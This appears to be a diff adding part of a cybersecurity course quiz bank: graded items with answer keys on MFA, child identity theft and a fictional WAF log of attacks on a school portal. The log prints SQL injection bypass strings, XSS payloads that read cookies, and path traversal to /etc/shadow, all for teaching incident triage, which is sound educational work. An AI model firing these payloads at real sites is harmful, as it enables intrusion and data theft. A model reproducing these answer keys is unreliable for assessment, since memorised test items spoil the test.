+      <explanation>Credential-based intrusions are the most common attack vector for education sector breaches. The discovery method ("unusual login activity noticed by a staff member") is consistent with an attacker using valid stolen credentials, there was no mention of exploited vulnerabilities or physical access. MFA with TOTP (6-digit time-based codes from an authenticator app) requires the attacker to possess both the password AND the user's phone/authenticator device during the valid 30-second code window. A credential dump or phishing attack that captures the password alone is defeated by TOTP MFA. For a school district, TOTP authenticator apps are the practical balance of security and operational cost, free apps (Google Authenticator, Authy), no hardware to provision, and manageable for district staff. FIDO2 hardware keys provide stronger anti-phishing protection but at significantly higher cost per user.</explanation>
+      <distractor_rationale>
+        <choice key="A">While advanced phishing kits (Evilginx, Modlishka) can intercept real-time TOTP codes through reverse proxy attacks, these are sophisticated techniques that significantly raise the cost and complexity of the attack. Standard credential phishing campaigns (which represent the vast majority of education sector attacks) do not have real-time MFA interception capability. MFA raises the bar substantially even if it is not an absolute barrier against the most sophisticated attacks.</choice>
+        <choice key="C">MFA protects authentication regardless of the hosting environment, attackers authenticating remotely via the web interface of an internally-hosted SIS must still complete the MFA challenge. Internal hosting does not bypass authentication requirements. MFA is specifically effective against remote credential-based intrusions, which is the threat model here.</choice>
+        <choice key="D">Software TOTP (authenticator apps) is significantly more effective against typical education-sector attacks than no MFA, even though FIDO2 hardware keys provide stronger anti-phishing protection. FIDO2 hardware keys eliminate real-time phishing interception entirely; TOTP raises the attacker's cost substantially and defeats non-real-time credential theft (the most common attack type). Perfect should not be the enemy of good in security control selection.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S07-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S07</stimulus_ref>
+        <topic_refs>5.5 5.6</topic_refs><lo_refs>LO 5.5.A LO 5.6.A LO 5.6.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.A" lo="LO 5.6.B" weight="0.55"/>
+        <secondary skill="2.A" lo="LO 5.5.A" weight="0.45"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.46</b_param><a_param>1.62</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>166</est_response_time_sec>
+        <prerequisite_topics>5.5 5.6</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>The letter recommends affected families "consider placing a credit freeze on your child's credit profile." Evaluate why a minor child's credit profile is a meaningful fraud target, and what this recommendation reveals about the long-term risk horizon of a school district breach involving children's PII.</stem>
+      <choices>
+        <choice key="A">A minor child has no credit profile, so a credit freeze is a meaningless recommendation, the district's legal team included it in error.</choice>
+        <choice key="B">The credit freeze recommendation is only relevant for students receiving financial assistance, whose families' financial data was exposed, students without financial assistance data exposure do not face credit fraud risk from this breach.</choice>
+        <choice key="C">Child identity theft is a particularly damaging fraud category precisely because children do not typically check their credit, fraudsters use a child's SSN and date of birth to open credit accounts, take out loans, or file fraudulent tax returns. The fraud may not be discovered for years, until the child applies for their first credit card, student loan, or apartment at age 18-22. A credit freeze prevents new credit accounts from being opened using the child's identity. This reveals that a school breach involving minors creates a long-tail risk extending 5-18 years beyond the breach date, far longer than adult identity theft timelines, because the fraudulent accounts accumulate silently for years before the victim can even check their own credit.</choice>
+        <choice key="D">A credit freeze on a child's credit profile prevents the child from being approved for student loans at age 18, creating financial harm from an overly cautious protective measure.</choice>
+      </choices>
+      <answer key="C"/>
+      <explanation>Child identity theft is a documented and serious fraud category: children's SSNs are "clean" (no existing credit history makes fraud easier to establish) and the victim typically cannot discover the fraud for years. The FTC specifically recommends credit freezes for minors as the most effective protection. From a school district's perspective, a breach of student records creates liability extending into the affected children's young adulthood, statute of limitations for identity theft harms may not begin until the victim discovers the fraud, potentially 15+ years post-breach. This distinguishes school district breaches from healthcare or financial breaches involving adults: the harm timeline extends uniquely long because the victims are minors who cannot monitor their own credit and whose stolen identities have long fraudulent utility before detection.</explanation>
+      <distractor_rationale>
+        <choice key="A">Minors can have credit profiles in the US, credit files are created when someone uses a SSN to open an account, regardless of age. Child identity theft specifically creates fraudulent credit files using minors' SSNs. The credit freeze prevents this by locking the credit bureau file so no new accounts can be opened, even creating a protective file if none previously existed.</choice>
+        <choice key="B">Name, date of birth, address, and student ID numbers, which all students' records contained, are sufficient for various forms of identity misuse including fraudulent government ID applications, benefits fraud, and medical identity theft. Credit fraud specifically uses SSNs, but the other exposed categories enable other fraud types affecting all students, not only those receiving financial assistance.</choice>
+        <choice key="D">A credit freeze can be temporarily lifted (thawed) for a specific period or creditor when the individual legitimately needs to apply for credit, this is a standard consumer protection feature of credit freezes. A freeze does not permanently block credit access; it blocks unauthorized new account openings. Thawing the freeze when the child applies for legitimate student loans at 18 is a straightforward process that does not cause financial harm.</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+
+<!-- S08 - WAF Log (Multiple Web Attack Types)
+     Topics: 5.1, 5.2 | Skills: 1.A 1.C 3.B 2.A+3.A -->
+<stimulus_set id="U5-S08" difficulty_range="1-3">
+  <stimulus>
+    <type>waf_log</type>
+    <label>Exhibit H - WAF Security Log: NovaStar Tech Public Web Application</label>
+    <context>NovaStar Tech's WAF (now in blocking mode) generated the following alerts over a 2-hour window against the public-facing student registration portal. The security team is triaging to determine which attacks succeeded before the WAF was switched to blocking mode at 14:00.</context>
+    <artifact format="log_file">
+      <log_type>ModSecurity WAF Alert Log - web-portal.novastar-tech.edu (12:00-14:00)</log_type>
+      <entries>
+TIME     RULE     SEV       ACTION  SRC_IP         URI                  ATTACK_TYPE          PAYLOAD_EXCERPT
+-------- -------- --------- ------- -------------- -------------------- -------------------- ------------------------
+12:04:11 942100   CRITICAL  PASS    203.0.113.11   /register.php        SQLi - Auth Bypass   username=admin'--
+12:04:14 942100   CRITICAL  PASS    203.0.113.11   /register.php        SQLi - Auth Bypass   username=' OR 1=1--
+12:04:14 [DB LOG] --        --      --             --                   --                   AUTH BYPASSED - logged in as user ID 1
+12:11:33 941100   HIGH      PASS    203.0.113.11   /profile.php?name=   XSS - Reflected      name=&lt;script&gt;alert(1)&lt;/script&gt;
+12:11:35 941100   HIGH      PASS    203.0.113.11   /profile.php?name=   XSS - Reflected      name=&lt;img src=x onerror=alert(document.cookie)&gt;
+12:22:08 931100   HIGH      PASS    203.0.113.55   /download.php?file=  Path Traversal       file=../../../etc/passwd
+12:22:11 931100   HIGH      PASS    203.0.113.55   /download.php?file=  Path Traversal       file=../../../../etc/shadow
+12:22:11 [SRV LOG]--        --      --             --                   --                   File not found: /var/www/../../../../etc/shadow (chroot contained)
+12:35:02 920350   MEDIUM    PASS    203.0.113.77   /api/students        IDOR                 GET /api/students/1042 then /1043 /1044... (sequential enumeration)
+12:35:44 920350   MEDIUM    PASS    203.0.113.77   /api/students        IDOR                 200 OK returned for IDs 1042-1198 (157 student records returned)
+13:58:21 921180   HIGH      BLOCK   203.0.113.99   /submit-form.php     CSRF                 Missing CSRF token (WAF blocked at 14:00 switch)
+14:00:00 [SYSTEM] --        BLOCK   --             --                   WAF switched to BLOCKING mode
+      </entries>
+      <note>PASS = WAF detected but did not block (was in detection-only mode until 14:00). BLOCK = WAF blocked the request.</note>
+    </artifact>
+    <provenance>Fictional. All IPs, URIs, and log entries are invented for educational purposes.</provenance>
+  </stimulus>
+  <items>
+
+    <question id="U5-S08-Q1">
+      <meta><unit>U5</unit><stimulus_ref>U5-S08</stimulus_ref>
+        <topic_refs>5.1 5.2</topic_refs><lo_refs>LO 5.1.A LO 5.2.A</lo_refs></meta>
+      <skill_vector><primary skill="1.A" lo="LO 5.1.A" weight="0.80"/>
+        <secondary skill="3.B" lo="LO 5.2.A" weight="0.20"/>
+      </skill_vector>
+      <adaptive_meta><b_param>-0.30</b_param><a_param>0.92</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>55</est_response_time_sec>
+        <prerequisite_topics>5.1 5.2</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The log at 12:35:02-12:35:44 shows GET requests to /api/students/1042, then /1043, /1044, returning 200 OK for 157 sequential student records. The WAF rule flagged this as "IDOR." What does IDOR mean and what access control failure does this attack exploit?</stem>
+      <choices>
+        <choice key="A">IDOR stands for Indirect Data Object Retrieval, it exploits SQL injection in the API's database query to enumerate records.</choice>
+        <choice key="B">IDOR stands for Insecure Direct Object Reference, the API uses sequential predictable student IDs as URL parameters and does not verify that the requesting user is authorized to access the requested student record. Any authenticated (or unauthenticated) user can access any student's record by incrementing the ID parameter. The fix is server-side authorization checks: verify that the authenticated user has permission to view the requested student ID before returning data, regardless of whether the ID is a valid database record.</choice>
+        <choice key="C">IDOR stands for Internal Directory Object Request, the attack is a form of directory traversal targeting the application's internal API directory structure.</choice>
+        <choice key="D">IDOR exploits missing rate limiting, the attack succeeded because the API allowed 157 requests without triggering a rate limit, not because of missing authorization checks.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>Insecure Direct Object Reference (IDOR) is an access control vulnerability where an application uses user-controllable identifiers (student IDs, order numbers, account numbers) to access objects without verifying the requesting user's authorization for each specific object. The API at /api/students/{id} correctly implemented authentication (the attacker had a session) but failed authorization (it did not check whether the authenticated user is permitted to view that specific student's record). Sequential integer IDs make IDOR trivially exploitable, the attacker incremented from 1042 to 1198 and received 157 student records they should not have accessed. OWASP lists IDOR as a top web application vulnerability precisely because authentication and authorization are distinct requirements, and developers often implement authentication while overlooking per-object authorization.</explanation>
+      <distractor_rationale>
+        <choice key="A">IDOR does not involve SQL injection. The vulnerability is at the API authorization layer, the API received valid HTTP requests with valid session credentials and returned data without checking if the requester was authorized for each specific object. No SQL injection is needed; the API's own legitimate data retrieval logic is exploited.</choice>
+        <choice key="C">IDOR is not related to directory traversal (path traversal is shown separately at 12:22:08). IDOR specifically refers to using direct references to data objects (record IDs, file names, account numbers) in a way that bypasses authorization checks. The "direct" in IDOR refers to the direct object identifier (the student ID number), not directory paths.</choice>
+        <choice key="D">Rate limiting is a mitigating control that slows down IDOR exploitation but does not prevent it, an attacker willing to pace their requests at 1 per minute would retrieve the same 157 records in 157 minutes. The root vulnerability is missing authorization checks on each object access, not missing rate limiting. Fixing rate limiting without fixing authorization leaves the vulnerability fully exploitable, just more slowly.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S08-Q2">
+      <meta><unit>U5</unit><stimulus_ref>U5-S08</stimulus_ref>
+        <topic_refs>5.1</topic_refs><lo_refs>LO 5.1.A LO 5.1.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="1.C" lo="LO 5.1.B" weight="0.70"/>
+        <secondary skill="3.B" lo="LO 5.1.A" weight="0.30"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.50</b_param><a_param>1.14</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>88</est_response_time_sec>
+        <prerequisite_topics>5.1</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The log shows a path traversal attempt at 12:22:08 (file=../../../etc/passwd) was contained by a "chroot", the server log states "File not found: /var/www/../../../../etc/shadow." Explain what path traversal exploits and what the chroot mechanism did to contain it.</stem>
+      <choices>
+        <choice key="A">Path traversal exploits SQL injection in the file download function. Chroot prevented this by blocking SQL commands from reaching the file system.</choice>
+        <choice key="B">Path traversal exploits insufficient validation of file path parameters, the attacker uses "../" sequences to navigate above the web root directory to access system files (/etc/passwd, /etc/shadow) outside the intended accessible scope. Chroot (change root) contains the attack by changing the process's apparent root directory to a specific directory (e.g., /var/www/), so when the application resolves "../../../../etc/shadow" it traverses only within the chroot jail and finds /var/www/etc/shadow (which does not exist), not the real /etc/shadow. The web server process cannot access files outside its chroot boundary even if path traversal succeeds syntactically.</choice>
+        <choice key="C">Path traversal exploits XSS vulnerabilities in file name display to execute JavaScript that reads system files. Chroot blocked the JavaScript execution.</choice>
+        <choice key="D">Chroot is a firewall rule that blocks outbound connections from the web server, it prevented the attacker from exfiltrating the /etc/shadow file after reading it.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>Path traversal (also called directory traversal) manipulates file path parameters by inserting "../" sequences (parent directory references) to escape the intended directory scope. A download function reading files based on a URL parameter like ?file=assignment.pdf is exploited with ?file=../../../etc/shadow to navigate up the directory tree. Chroot changes the effective root directory for a process: /etc/shadow from the real filesystem is unreachable because the chroot jail's "/" maps to /var/www/ — the traversal "../../../../etc/shadow" resolves to /var/www/etc/shadow, which does not exist. The server log confirms this: "File not found: /var/www/../../../../etc/shadow", the traversal resolved but found nothing because the chroot contained it within /var/www/. Chroot is a defense-in-depth control; the root fix is validating that file parameters contain no "../" sequences and resolve only within the intended download directory.</explanation>
+      <distractor_rationale>
+        <choice key="A">Path traversal is a file system attack exploiting inadequate path validation, not SQL injection. The attack uses directory navigation sequences ("../"), not SQL syntax. Chroot is a process isolation mechanism, not a SQL filter.</choice>
+        <choice key="C">Path traversal does not involve XSS. These are distinct attack categories: XSS injects JavaScript into HTML responses; path traversal uses directory sequences to access unauthorized filesystem paths. The file download endpoint does not render HTML that would execute JavaScript.</choice>
+        <choice key="D">Chroot is an OS-level process isolation mechanism that restricts the filesystem view, not a network firewall rule. Chroot operates entirely on the server's filesystem resolution, independent of outbound network connections.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S08-Q3">
+      <meta><unit>U5</unit><stimulus_ref>U5-S08</stimulus_ref>
+        <topic_refs>5.1 5.2</topic_refs><lo_refs>LO 5.1.C LO 5.2.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="3.B" lo="LO 5.1.C" weight="0.65"/>
+        <secondary skill="2.A" lo="LO 5.2.B" weight="0.35"/>
+      </skill_vector>
+      <adaptive_meta><b_param>0.85</b_param><a_param>1.28</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>102</est_response_time_sec>
+        <prerequisite_topics>5.1 5.2</prerequisite_topics><mastery_threshold>0.75</mastery_threshold><exposure_cap>3</exposure_cap>
+      </adaptive_meta>
+      <stem>The WAF log entry at 13:58:21 shows a CSRF attack was blocked with the note "Missing CSRF token." Explain what CSRF is, why a missing CSRF token indicates the attack was blocked, and what a CSRF attack would have accomplished against a student registration portal.</stem>
+      <choices>
+        <choice key="A">CSRF (Cross-Site Request Forgery) is the same as XSS, both inject malicious scripts into web pages. A CSRF token is an encryption key that prevents script injection.</choice>
+        <choice key="B">CSRF (Cross-Server Request Forgery) causes the application server to make outbound requests to internal services. A missing CSRF token means the server did not authenticate the outbound request target.</choice>
+        <choice key="C">CSRF (Cross-Site Resource Forgery) steals authentication cookies from the browser's cookie store by forging cross-site requests. A CSRF token prevents cookie access by limiting which sites can read the cookie value.</choice>
+        <choice key="D">CSRF (Cross-Site Request Forgery) tricks an authenticated user's browser into submitting an unauthorized form request to a target application, exploiting the fact that the browser automatically includes session cookies with all requests to that domain. A CSRF token is a unique secret value embedded in each legitimate form; the server validates the token on submission, rejecting requests without it. Against a registration portal, a CSRF attack could submit enrollment changes, modify contact information, or trigger password resets in an authenticated student's or parent's account without their knowledge, by embedding a malicious form in an email or third-party site that the authenticated user visits.</choice>
+      </choices>
+      <answer key="D"/>
+      <explanation>CSRF exploits the browser's automatic cookie inclusion behavior: when a user is logged into portal.novastar-tech.edu, any HTTP request to that domain, even one triggered by a link or form on a different website, includes the user's session cookies. An attacker who tricks the user into visiting a malicious page containing a hidden form targeting /submit-form.php can submit that form with the user's authenticated session automatically attached. The CSRF token countermeasure works by including a unique unpredictable value in each legitimate form (not in cookies, but in the form HTML) that the server checks on submission. A cross-site form submission cannot include the correct CSRF token (the attacker's site cannot read the token from the legitimate site due to browser same-origin policy), so the server rejects it. The WAF also validates CSRF token presence as an additional layer.</explanation>
+      <distractor_rationale>
+        <choice key="A">CSRF and XSS are distinct attack types: XSS injects malicious scripts into web pages served by the target site; CSRF forges requests from the victim's authenticated browser without injecting any code. CSRF tokens protect against forged form submissions, not script injection. XSS is defended with output encoding.</choice>
+        <choice key="B">Server-Side Request Forgery (SSRF) causes the server to make outbound requests to attacker-controlled targets. CSRF is a client-side attack causing the user's browser to make requests. These are completely different attack types despite the similar-sounding names.</choice>
+        <choice key="C">CSRF does not steal cookies from the browser store, it exploits the browser's automatic cookie inclusion without needing to read the cookie value. The attacker never sees the session cookie; they just cause the victim's browser to use it. Same-origin policy prevents JavaScript on evil.com from reading cookies from novastar-tech.edu.</choice>
+      </distractor_rationale>
+    </question>
+
+    <question id="U5-S08-Q4">
+      <meta><unit>U5</unit><stimulus_ref>U5-S08</stimulus_ref>
+        <topic_refs>5.1 5.2</topic_refs><lo_refs>LO 5.1.A LO 5.1.B LO 5.1.C LO 5.2.A LO 5.2.B</lo_refs></meta>
+      <skill_vector>
+        <primary skill="2.A" lo="LO 5.1.C" weight="0.53"/>
+        <secondary skill="3.A" lo="LO 5.2.B" weight="0.47"/>
+      </skill_vector>
+      <adaptive_meta><b_param>1.48</b_param><a_param>1.63</a_param><c_param>0.25</c_param>
+        <est_response_time_sec>168</est_response_time_sec>
+        <prerequisite_topics>5.1 5.2</prerequisite_topics><mastery_threshold>0.80</mastery_threshold><exposure_cap>2</exposure_cap>
+      </adaptive_meta>
+      <stem>The WAF log shows five distinct attack types in 2 hours: SQLi (succeeded: auth bypass), XSS (detected, outcome unknown), path traversal (contained by chroot), IDOR (succeeded: 157 records returned), and CSRF (blocked by WAF). Reviewing the log, prioritize which two succeeded attacks require immediate remediation, and for each identify the code-level fix that the WAF cannot substitute for.</stem>
+      <choices>
+        <choice key="A">Prioritize XSS and path traversal, the WAF was unable to contain either, making them the most urgent. SQLi and IDOR are less urgent since the WAF detected them.</choice>
+        <choice key="B">Prioritize SQLi (auth bypass at 12:04:14, confirmed by DB log "AUTH BYPASSED") and IDOR (157 student records returned at 12:35:44, confirmed by 200 OK responses). Both succeeded before the WAF switched to blocking mode. SQLi fix: parameterized queries on /register.php login function (WAF pattern matching cannot substitute because payloads can be obfuscated to bypass rules). IDOR fix: server-side per-object authorization check on /api/students/{id} verifying the requesting user has access to that specific student record (WAF cannot check authorization because it has no knowledge of the application's access control model).</choice>
+        <choice key="C">Prioritize path traversal and CSRF, path traversal targeted system files and CSRF was the most recent attack. SQLi and IDOR are lower priority because they only affected the login page and API.</choice>
+        <choice key="D">All five attacks have equal priority, since the WAF is now in blocking mode, all future attempts will be blocked and remediation can be scheduled during the next quarterly development cycle.</choice>
+      </choices>
+      <answer key="B"/>
+      <explanation>Prioritization is based on confirmed success (evidence of impact) rather than attack sophistication. The DB log at 12:04:14 explicitly confirms "AUTH BYPASSED, logged in as user ID 1" for SQLi; the API log at 12:35:44 confirms "200 OK returned for IDs 1042-1198 (157 student records returned)" for IDOR. These are confirmed data access events with tangible breach scope. Path traversal was contained (chroot produced file-not-found); XSS detection-mode outcome is unclear but cookie theft requires a victim to load a crafted URL; CSRF was blocked. The WAF-cannot-substitute argument is critical: WAF rules use pattern matching that attackers bypass through encoding and obfuscation; parameterized queries and server-side authorization checks operate at the application logic level where bypass is structurally prevented, not just pattern-detected. Code-level fixes are the root-cause remediation; WAF blocking is defense-in-depth.</explanation>
+      <distractor_rationale>
+        <choice key="A">The log shows XSS in PASS mode (detection only) with unknown outcome, and path traversal was contained by chroot. Neither has confirmed data impact. SQLi and IDOR have confirmed successful exploitation (AUTH BYPASSED; 157 records returned), these are the highest-priority confirmed incidents, not the unconfirmed or contained ones.</choice>
+        <choice key="C">Path traversal was contained (server log shows file-not-found within chroot), and CSRF was blocked by the WAF. Neither produced confirmed data exposure. SQLi produced confirmed authentication bypass to user ID 1 (likely admin account) and IDOR produced 157 confirmed student record disclosures, both are more immediately damaging confirmed incidents.</choice>
+        <choice key="D">WAF blocking mode is not a substitute for fixing root-cause vulnerabilities. WAF rules are bypassable: the SQLi auth bypass and IDOR both succeeded while the WAF was in detection mode and logged the attacks. An attacker aware of the WAF switch can test obfuscated payloads in blocking mode to find bypass techniques. Additionally, scheduling remediation for a quarterly cycle after confirmed authentication bypass (an admin account may be compromised) is not an acceptable incident response timeline.</choice>
+      </distractor_rationale>
+    </question>
+
+  </items>
+</stimulus_set>
+
+</unit_quizbank>
